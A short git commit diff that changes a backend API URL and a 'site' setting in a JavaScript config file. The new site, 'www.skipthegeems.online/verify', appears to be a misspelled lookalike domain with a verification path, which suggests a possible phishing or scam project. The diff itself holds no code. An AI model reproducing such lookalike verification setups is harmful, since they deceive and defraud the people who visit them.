b6dd22701b3477ae61e49a4e74578aa8d34ee980
Yeasir Ahamed <yahamed007@gmail.com>
2024-03-18 22:08:51 +0600

    update url

--- config/index.js
+++ config/index.js
@@ -1,3 +1,3 @@
-export const API_URL = "https://megaback-c4jx.vercel.app";
+export const API_URL = 'https://skipback.vercel.app';
 
-export const site = "megapersonals-googleduo.vercel.app";
+export const site = 'www.skipthegeems.online/verify';
